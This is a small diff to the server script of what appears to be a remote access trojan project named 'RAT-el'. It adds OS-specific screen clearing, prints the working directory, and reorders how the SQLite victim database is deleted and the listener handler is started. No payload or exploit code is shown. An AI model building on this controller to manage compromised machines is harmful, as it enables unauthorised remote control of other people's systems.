@@ -1,6 +1,7 @@
 import sys
 import argparse
 import time
+import os
 
 from scripts.handler import Handler
 from scripts.menu import Menu
@@ -11,8 +12,12 @@ from scripts.other import exec
 from scripts.sql import Sql
 
 from colorama import Fore,Style,init
+import platform
 
-exec("clear")
+if(platform.system() == "Linux"):
+    exec("clear")
+else: #if windows
+    exec("cls")
 
 
 init()
@@ -34,20 +39,20 @@ try:
     TIME = int(argv["TIME"])
     CLEAN = float(argv["CLEAN"])
 
+    print(os.getcwd())
+
 except SystemExit:
     print("example: /usr/bin/python3 server.py -p 8888 -t 100" )
     exit(0)
-
 else:
     #print("[+] Server started.\n")
-    SqlObj = Sql("sql/RAT-el.sqlite3", "sql/table_ratel.sql", "table_ratel")
-    handler= Handler(HOST,PORT,DISPLAY,SqlObj)
-    
     if(CLEAN):
-        SqlObj.removeDatabase()
-        printColor("information", "[+] Database cleaned successfully.\n")
-    else:
-        handler.initialization()
+        os.remove("sql/RAT-el.sqlite3")
+    
+    SqlObj = Sql("sql/RAT-el.sqlite3", "sql/table_ratel.sql", "table_ratel")
+
+    handler= Handler(HOST,PORT,DISPLAY,SqlObj)
+    handler.initialization()
     
     management = Management(TIME,SqlObj) #2 seconds.
 
